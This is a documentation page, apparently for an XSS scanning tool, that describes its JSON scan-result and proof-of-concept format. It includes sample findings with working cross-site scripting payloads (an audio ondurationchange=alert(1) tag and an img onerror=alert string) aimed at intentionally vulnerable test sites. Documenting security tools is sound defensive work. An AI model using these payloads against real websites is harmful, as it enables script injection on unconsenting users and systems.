---
title: Result JSON Format
permalink: /docs/json/
nav_order: 5
toc: true
layout: page
---

## Scan Result
```json
{
 "logs": null,
 "pocs": [
  {
   "type": "V",
   "inject_type": "inHTML-none(1)-URL",
   "poc_type": "plain",
   "method": "GET",
   "data": "https://xss-game.appspot.com/level1/frame?query=%3Caudio+controls+ondurationchange%3Dalert%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E",
   "param": "query",
   "payload": "\u003caudio controls ondurationchange=alert(1) id=dalfox\u003e\u003csource src=1.mp3 type=audio/mpeg\u003e\u003c/audio\u003e",
   "evidence": "13 line:  s were found for \u003cb\u003e\u003caudio controls ondurationchange=alert(1) id=dalfox\u003e\u003csource ",
   "cwe": "CWE-79",
   "severity": "High",
   "message_id": 223,
   "message_str": "Triggered XSS Payload (found DOM Object): query=\u003caudio controls ondurationchange=alert(1) id=dalfox\u003e\u003csource src=1.mp3 type=audio/mpeg\u003e\u003c/audio\u003e",
   "raw_request": "GET /level1/frame?query=%3Caudio+controls+ondurationchange%3Dalert%281%29+id%3Ddalfox%3E%3Csource+src%3D1.mp3+type%3Daudio%2Fmpeg%3E%3C%2Faudio%3E HTTP/1.1\r\nHost: xss-game.appspot.com\r\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:75.0) Gecko/20100101 Firefox/75.0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-Encoding: gzip\r\n\r\n"
  }
 ],
 "params": [
  {
   "Name": "query",
   "Type": "URL",
   "Reflected": true,
   "ReflectedPoint": "/inHTML-none(1)",
   "ReflectedCode": "13 line:  Sorry, no results were found for \u003cb\u003eDalFox\u003c/b\u003e. \u003ca href='?'\u003eTry again",
   "Chars": [
    "\\",
    ")",
    "|",
    "\"",
    "'",
    "-",
    "`",
    "\u003e",
    "$",
    "+",
    "]",
    "=",
    ";",
    ":",
    "[",
    "}",
    "{",
    ",",
    "(",
    ".",
    "\u003c"
   ]
  }
 ],
 "duration": 4841809667,
 "start_time": "2023-03-28T11:07:15.574531+09:00",
 "end_time": "2023-03-28T11:07:20.416285+09:00"
}
```

## PoC
```json
{
      "type":"Type of PoC (G/R/V)",
      "inject_type":"Injected Point",
      "poc_type":"plain/curl/httpie/etc...",
      "method":"HTTP Method",
      "data":"PoC URL",
      "param":"Parameter",
      "payload":"Attack Value",
      "evidence":"Evidence with response body",
      "cwe":"CWE ID",
      "severity": "Severity (Low/Medium/High)",
      "message_id": "Message ID",
      "message_str": "Message String (POC)",
      "raw_request": "Raw HTTP Request (require --output-request flag)",
      "raw_response": "Raw HTTP Response (require --output-response flag)"
   }
```

| Key         | Description                 | List                                                         |
| ----------- | --------------------------- | ------------------------------------------------------------ |
| type        | Type                        | - G (Grep)<br />- R (Reflected)<br />- V (Verified)          |
| inject_type | Injected point              | - inHTML-none (Injected in HTML area)<br />- inJS-none (Injected in Javascript area)<br />- inJS-double (Injected within `"` in Javascript area)<br />- inJS-single (Injected within `'` in Javascript area)<br />- inJS-backtick (Injected within backtic1k in Javascript area)<br />- inATTR-none (Injected within in Tag attribute area)<br />- inATTR-double (Injected within `"` in Tag attribute area)<br />- inATTR-single (Injected within `'` in Tag attribute area) |
| poc_type    | Type of poc code            | - plain (URL)<br />- curl (Curl command)<br />- httpie (HTTPie command) |
| method      | HTTP Method                 | - GET/POST/PUT/DELETE, etc...                                |
| data        | PoC (URL)                   | - PoC URL                                                    |
| param       | Parameter name              | - Weak parameter name                                        |
| payload     | Parameter value             | - Attack code in value                                       |
| evidence    | Evidence with response body | - Simple codeview of where it's injected in response body.   |
| cwe         | CWE ID                      | - Mapping CWE ID                                             |
| severity    | Severity                    | - Severity (Low/Medium/High)                                 |
| raw_request | Raw HTTP Request            | - Raw HTTP Request                                           |
| raw_response| Raw HTTP Response           | - Raw HTTP Response                                          |

```json
{
    "type": "V",
    "inject_type": "inHTML-URL",
    "poc_type": "plain",
    "method": "GET",
    "data": "http://testphp.vulnweb.com/listproducts.php?cat=%27%22%3E%3Cimg%2Fsrc%2Fonerror%3D.1%7Calert%60%60+class%3Ddalfox%3E",
    "param": "cat",
    "payload": "'\"><img/src/onerror=.1|alert`` class=dalfox>",
    "evidence": "48 line:  syntax to use near ''\"><img/src/onerror=.1|alert`` class=dalfox>' at line 1",
    "cwe": "CWE-79",
    "severity": "High"
}
```
